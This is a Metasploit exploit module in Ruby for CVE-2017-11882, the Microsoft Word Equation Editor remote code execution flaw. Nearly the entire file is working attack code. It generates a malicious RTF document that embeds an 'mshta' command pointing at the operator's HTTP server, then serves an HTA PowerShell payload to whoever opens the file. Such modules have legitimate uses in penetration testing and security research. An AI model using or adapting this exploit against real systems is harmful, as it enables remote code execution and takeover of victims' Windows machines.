class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::HttpServer::HTML
  
    def initialize(info = {})
      super(update_info(info,
        'Name'           => "Microsoft Office Word Equation Editor RCE",
        'Description'    => %q{
          This module creates a malicious RTF file that when opened in
          vulnerable versions of Microsoft Word will lead to code execution.
        },
        'Author'         =>
          [
            'embedi', # Vulnerability analysis and discovery
            '0x09AL', # Module developer
          ],
        'License'        => MSF_LICENSE,
        'References'     => [
          ['CVE', '2017-11882'],
	      ['URL', 'https://github.com/embedi/CVE-2017-11882/']
        ],
        'Platform'       => 'win',
        'Targets'        =>
          [
            [ 'Microsoft Office Word', {} ]
          ],
        'DefaultOptions' =>
          {
            'DisablePayloadHandler' => false
          },
        'DefaultTarget'  => 0,
        'Privileged'     => false,
        'DisclosureDate' => 'Nov 21 2017'))
  
      register_options([
        OptString.new('FILENAME', [ true, 'The file name.', 'msf.rtf']),
        OptString.new('URIPATH',  [ true, 'The URI to use for the HTA file', 'pl.hta'])
      ])
    end
  
  
    def generate_command
        command_max_length = 44
        command = "mshta "
        host = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']
        scheme = datastore['SSL'] ? 'https' : 'http'
        hta_uri = "#{scheme}://#{host}:#{datastore['SRVPORT']}#{'/' + Rex::FileUtils.normalize_unix_path(datastore['URIPATH'])}"
        command << hta_uri
	command = Rex::Text.hexify(command)
        command.delete!("\n")
        command.delete!("\\x")
        command.delete!("\\")
	padding_size = (command_max_length * 2 - command.length)/2
	command << "90" * padding_size
        fail_with(Failure::BadConfig, "Command line exceeds #{command_max_length} bytes ") if command.length > (command_max_length*2)
        print_status("Generating command with length #{command.length/2}")
        command
    end
  
    def create_rtf_file
      template_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2017-11882.rtf")
      template_rtf = ::File.open(template_path, 'rb')
      data = template_rtf.read(template_rtf.stat.size)
      data.gsub!('COMMAND_TO_EXECUTE', generate_command)
      template_rtf.close
      data
    end
  
    def on_request_uri(cli, req)
	print_status("Delivering payload")
	hta_payload = regenerate_payload(cli)
	data = Msf::Util::EXE.to_executable_fmt(framework,ARCH_X86,'win', hta_payload.encoded,'hta-psh', { :arch => ARCH_X86, :platform => 'win '} )
	send_response(cli, data, 'Content-Type' => 'application/hta')
    end
  
    def exploit
      file_create(create_rtf_file)
      super
    end
  end
